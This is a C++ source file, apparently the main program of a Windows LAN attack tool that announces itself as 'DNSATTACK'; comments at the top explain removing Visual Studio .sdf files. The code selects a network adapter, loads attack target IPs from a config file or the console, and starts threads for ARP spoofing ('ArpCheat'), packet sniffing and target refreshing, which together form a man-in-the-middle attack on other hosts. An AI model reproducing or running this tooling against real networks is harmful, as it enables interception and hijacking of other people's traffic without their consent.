//SQL Server Compact Edition Database File (.sdf)文件，是工程的信息保存成了数据库文件，
//如果你没有参加大型的团队项目，不涉及到高深的调试过程，这个文件对于你来说没什么用了，可以放心的删除，
//如果你后来又需要这个文件了，简单，打开工程里的.sln文件重新编译链接就ok了。
//如果完全不需要，有讨厌这个文件太大，那么可以：在Visual Studio里进入如下设置：
//进入“Tools > Options”，选择“Text Editor > C/C++ > Advanced”，然后找到“Fallback Location”。
//然后把“Always use Fallback Location”和“Do Not Warn if Fallback Location”设置成“True” 

// 正确顺序
#define WIN32_LEAN_AND_MEAN  // 减少不必要的头文件
#include <winsock2.h>
#include <windows.h>

#include <stdio.h>


#include "Utils.h"
#include "Packet.h"
#include "Public.h"
#include "PacketProcess.h"
#include <pcap.h>
#include <pcap\\pcap.h>
#include <openssl\\ssl.h>
#include <openssl\\err.h>
#include "connectionManager.h"
#include <Nb30.h>
#include <IPHlpApi.h>
#include "Netcard.h"
#include "ArpCheat.h"
#include "ClientAddress.h"
#include <vector>
#include "config.h"
#include "virtualIP.h"
#include "staticGateway.h"
#include "Utils.h"
#include "winpcap.h"
#include "RefreshTargets.h"
#include "nat.h"
#include <stdlib.h>
#include <conio.h>

#ifdef _WIN64
#pragma comment(lib,"netapi32.lib")
//#pragma comment ( lib, "..\\lib\\x64\\libeay32.lib" )
//#pragma comment ( lib, "..\\lib\\x64\\ssleay32.lib" )
#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"..\\lib\\x64\\wpcap.lib")
#else
#pragma comment(lib,"netapi32.lib")
#pragma comment ( lib, "..\\lib\\libeay32.lib" )
#pragma comment ( lib, "..\\lib\\ssleay32.lib" )
#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"..\\lib\\wpcap.lib")
#endif


#define WSASTARTUP_VERSION					0x0202

//netsh interface ip set address name ="localConnection" source= static 192.168.10.5 255.255.255.0 192.168.10.1




int __cdecl main(int argc, TCHAR* argv[])
{
	//test();

	int	nRetCode = 0;

	char curdir[MAX_PATH] = { 0 };
	nRetCode = GetCurrentDirectoryA(MAX_PATH, curdir);
	string curPath = string(curdir) + "\\";

	WORD wVersionRequested = MAKEWORD(2, 2);
	WSADATA wsaData = {0};
	if (WSAStartup(wVersionRequested, &wsaData) != 0)
	{
		printf("WSAStartup error code:%d\n", GetLastError());
		nRetCode = _getch();
		return -1;
	}

	int	iInterfaceCnt = 0;
	PIP_ADAPTER_INFO padpterInfo = NetcardInfo::ShowNetCard(&iInterfaceCnt);
	if (padpterInfo == FALSE)
	{
		nRetCode = _getch();
		return FALSE;
	}

	printf("Please input netcard number(1-%d):", iInterfaceCnt);
	int			iChooseNum = 0;
	scanf_s("%d", &iChooseNum);
	printf("\n");
	if (iChooseNum < 1 || iChooseNum > iInterfaceCnt)
	{
		printf("Interface number out of range\n");
		nRetCode = _getch();
		return -1;
	}
	PIP_ADAPTER_INFO pAdapter = NetcardInfo::GetNetCardAdapter(padpterInfo, iChooseNum - 1);
	
	gLocalIP = inet_addr(pAdapter->IpAddressList.IpAddress.String);
	string tmp = Utils::formatIP(gLocalIP);
	printf("Local ip:%s\r\n", tmp.c_str());

	gGatewayIP = inet_addr(pAdapter->GatewayList.IpAddress.String);
	tmp = Utils::formatIP(gGatewayIP);
	printf("Gateway ip:%s\r\n", tmp.c_str());

	memmove(gLocalMAC, pAdapter->Address, MAC_ADDRESS_SIZE);
	tmp = Utils::formatMAC(gLocalMAC);
	printf("Local mac:%s\r\n", tmp.c_str());

	nRetCode = ClientAddress::GetMACFromIP(gGatewayIP, gGatewayMAC);
	tmp = Utils::formatMAC(gGatewayMAC);
	printf("Gateway mac:%s\r\n", tmp.c_str());

	gNetMask = inet_addr(pAdapter->IpAddressList.IpMask.String);
	tmp = Utils::formatIP(gNetMask);
	printf("Subnet mask:%s\r\n", tmp.c_str());

	gNetMaskIP = gNetMask & gGatewayIP;
	tmp = Utils::formatIP(gNetMaskIP);
	printf("Net mask:%s\r\n", tmp.c_str());

	lstrcpyA(gDevName, pAdapter->AdapterName);
	printf("Card name:%s\r\n", gDevName);

	gNetcardIndex = pAdapter->Index;
	printf("Card index:%d\r\n", gNetcardIndex);

	gCardName = StaticGateway::getAdapterAlias(gDevName);
	printf("Card alias:%s\r\n", gCardName.c_str());

	string devdescp = pAdapter->Description;

	GlobalFree((char*)padpterInfo);
	
	nRetCode = StaticGateway::bindStaticGatewayMac(gNetcardIndex, gGatewayIP, gGatewayMAC);

	nRetCode = Config::getAttackTarget(curPath + string(CONFIG_INIT_FILENAME),gAttackTargetIP,
		&gCapSpeed,&gArpDelay,&gMode);
	if (gMode == PROXY_MODE) {

	}
	else if (gMode == ATTACK_MODE && gAttackTargetIP.size() <= 0)
	{
		printf("%s format error\r\n", (curPath + string(CONFIG_INIT_FILENAME)).c_str());
		do 
		{
			printf("Please input ip address to attack:");
			char sztargets[4096] = { 0 };
			nRetCode = scanf("%s", sztargets);
			printf("\r\n");

			nRetCode = Config::getAttackTargetFromCmd(sztargets,gAttackTargetIP,&gCapSpeed,&gArpDelay);
			if (nRetCode > 0)
			{
				break;
			}
			else {
				printf("parse command error!\r\n");
			}

		} while (1);
	}
	else {
		printf("Parse config error!\r\n");
		nRetCode = _getch();
		return -1;
	}

	pcap_t * pcapt = Winpcap::init(string(gDevName),gCapSpeed);
	if (pcapt <= 0)
	{
		printf("pcap init error!\r\n");
		nRetCode = _getch();
		return -1;
	}

	//gVirtualProxyIP = inet_addr("10.1.1.111");
	//gVirtualProxyIP = inet_addr("192.168.137.111");
	printf("\r\nStart working,please wait...\r\n");
	gVirtualProxyIP = VirtualIP::GetVirtualIP(pcapt, gTotalObjects);
	if (gVirtualProxyIP <= 0) {
		nRetCode = _getch();
		return -1;
	}

	HANDLE hThreadArpCheat = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ArpCheat::ArpCheatProc, pcapt,0, 0);
	CloseHandle(hThreadArpCheat);

	HANDLE hPcapMainProcess = CreateThread(0,0,(LPTHREAD_START_ROUTINE)PacketProcess::Sniffer, pcapt,0,0);
	if(hPcapMainProcess == FALSE)
	{
		printf("CreateThread error!error code is:%d\n",GetLastError());
		nRetCode = _getch();
		return GetLastError();
	}
// 	nRetCode = SetThreadPriority(hPcapMainProcess,THREAD_PRIORITY_HIGHEST);
// 	if(!nRetCode)
// 	{
// 		printf("SetThreadPriority error!error code is:%d\n",GetLastError());
// 		getchar();
// 		return GetLastError();
// 	}
	CloseHandle(hPcapMainProcess);

	HANDLE hclear = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ConnectionManager::clearmap, 0, 0, 0);
	CloseHandle(hclear);

	CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)RefreshTargets::refreshTargets, pcapt, 0, 0));

	printf("DNSATTACK正在监听网卡:%s\n", devdescp.c_str());

	while (TRUE)
	{
		Sleep(0xffffffff);
	}

	//pcap_freealldevs(pcapt);
	pcap_close(pcapt);
	
	return nRetCode;
}
